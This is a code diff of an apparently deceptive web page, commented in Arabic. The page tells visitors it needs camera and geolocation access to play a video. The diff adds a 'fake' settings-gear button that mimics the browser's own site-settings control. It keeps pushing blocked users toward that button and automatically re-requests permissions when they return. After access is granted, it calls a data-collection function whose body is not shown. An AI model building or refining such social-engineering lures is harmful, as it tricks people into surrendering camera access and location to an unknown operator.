@@ -151,12 +151,8 @@
         }
 
         @keyframes spin {
-            0% {
-                transform: translate(-50%, -50%) rotate(0deg);
-            }
-            100% {
-                transform: translate(-50%, -50%) rotate(360deg);
-            }
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
         }
 
         #loading {
@@ -248,7 +244,7 @@
             background: #1e1e1e;
             padding: 40px 30px;
             border-radius: 24px;
-            max-width: 420px;
+            max-width: 450px;
             width: 90%;
             text-align: center;
             border: 1px solid #333;
@@ -278,37 +274,46 @@
             background: #ff0000;
             color: #fff;
             border: none;
-            padding: 14px 35px;
+            padding: 14px 20px;
             border-radius: 50px;
             font-size: 1.1rem;
             font-weight: bold;
             cursor: pointer;
             transition: 0.3s;
             width: 100%;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
         }
         .modal-box .btn-primary:hover {
             background: #cc0000;
             transform: scale(1.02);
         }
-        .modal-box .btn-secondary {
+        .modal-box .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        /* ===== زر الترس الوهمي (الذي يحاكي زر الترس في شريط العناوين) ===== */
+        .modal-box .btn-settings {
             background: #333;
             color: #fff;
-            border: none;
-            padding: 14px 35px;
+            border: 2px solid #555;
+            padding: 14px 20px;
             border-radius: 50px;
             font-size: 1.1rem;
             font-weight: bold;
             cursor: pointer;
             transition: 0.3s;
             width: 100%;
-            display: none; /* يظهر فقط عند الحظر */
+            display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
+            gap: 10px;
         }
-        .modal-box .btn-secondary:hover {
-            background: #555;
+        .modal-box .btn-settings:hover {
+            background: #444;
+            border-color: #888;
+        }
+        .modal-box .btn-settings .gear-icon {
+            font-size: 1.4rem;
         }
         .modal-box .status-msg {
             color: #ffaa00;
@@ -320,21 +325,35 @@
             color: #666;
             font-size: 0.8rem;
             margin-top: 10px;
+            border-top: 1px solid #333;
+            padding-top: 12px;
+        }
+        .modal-box .sub-text .highlight {
+            color: #ffaa00;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
 
-    <!-- ===== النافذة المنبثقة المركزية ===== -->
+    <!-- ===== النافذة المنبثقة المركزية مع زر الترس الوهمي ===== -->
     <div id="permissionModal">
         <div class="modal-box">
             <div class="icon-lock">🔐</div>
             <h2>أذونات مطلوبة</h2>
             <p>يحتاج الموقع إلى الوصول إلى <strong>الكاميرا</strong> و <strong>الموقع الجغرافي</strong> لتشغيل الفيديو.</p>
+            
             <button id="allowPermissionsBtn" class="btn-primary">✅ تفعيل الأذونات</button>
-            <button id="openSettingsBtn" class="btn-secondary">⚙️ فتح إعدادات الموقع (الترس)</button>
+            
+            <!-- زر الترس الوهمي (موجود دائماً) -->
+            <button id="openSettingsBtn" class="btn-settings">
+                <span class="gear-icon">⚙️</span> فتح إعدادات الموقع (الترس)
+            </button>
+            
             <div id="permissionStatus" class="status-msg"></div>
-            <div class="sub-text">سيظهر طلب من المتصفح، يرجى الضغط على "سماح"</div>
+            <div class="sub-text">
+                <span class="highlight">💡</span> إذا ظهر حظر من المتصفح، استخدم زر <strong>"فتح إعدادات الموقع"</strong> أعلاه.
+            </div>
         </div>
     </div>
 
@@ -702,11 +721,12 @@
                 if (settingsOpened) return;
                 settingsOpened = true;
 
-                // إظهار النافذة في وسط الشاشة
                 modal.classList.add('active');
                 statusMsg.textContent = '';
-                settingsBtn.style.display = 'none';
+                allowBtn.disabled = false;
                 allowBtn.style.display = 'block';
+                // زر الترس ظاهر دائماً
+                settingsBtn.style.display = 'flex';
             }
 
             // ===== معالج النقر على "تفعيل الأذونات" =====
@@ -717,33 +737,29 @@
                 const result = await requestAllPermissions();
 
                 if (result.cameraGranted || result.locationGranted) {
-                    // تم منح بعض الأذونات على الأقل
                     statusMsg.textContent = '✅ تم تفعيل الأذونات! جاري التحميل...';
                     modal.classList.remove('active');
                     await collectDataAndPlay();
                 } else {
-                    // تم الحظر الكامل
-                    statusMsg.textContent = '❌ تم حظر الأذونات. يرجى فتح الإعدادات يدوياً.';
-                    allowBtn.style.display = 'none';
-                    settingsBtn.style.display = 'flex'; // يظهر زر الترس البديل
+                    statusMsg.textContent = '❌ تم حظر الأذونات. استخدم زر "فتح إعدادات الموقع" أدناه.';
+                    // نبقى في النافذة، وزر الترس موجود بالفعل
                 }
                 allowBtn.disabled = false;
             });
 
-            // ===== معالج النقر على زر "فتح الإعدادات" (محاكاة الترس) =====
+            // ===== معالج النقر على زر الترس الوهمي =====
             settingsBtn.addEventListener('click', function() {
-                statusMsg.textContent = '⏳ جاري فتح الإعدادات...';
+                statusMsg.textContent = '⏳ جاري فتح إعدادات الموقع...';
                 openLocationSettings();
             });
 
             // ===== عند العودة من الإعدادات (الترس) =====
             document.addEventListener('visibilitychange', function() {
                 if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
-                    // إذا كانت النافذة لا تزال ظاهرة، نحاول مرة أخرى
+                    // إذا كانت النافذة لا تزال ظاهرة، نحاول إعادة طلب الأذونات
                     if (modal.classList.contains('active')) {
-                        // إذا تم حظر الأذونات سابقاً، نعيد المحاولة
                         statusMsg.textContent = '🔄 جاري إعادة المحاولة بعد العودة من الإعدادات...';
-                        // نعيد طلب الأذونات تلقائياً
+                        // نعيد طلب الأذونات تلقائياً (محاكاة الضغط على زر التفعيل)
                         allowBtn.click();
                     } else {
                         // إذا كانت مخفية، نكمل مباشرة
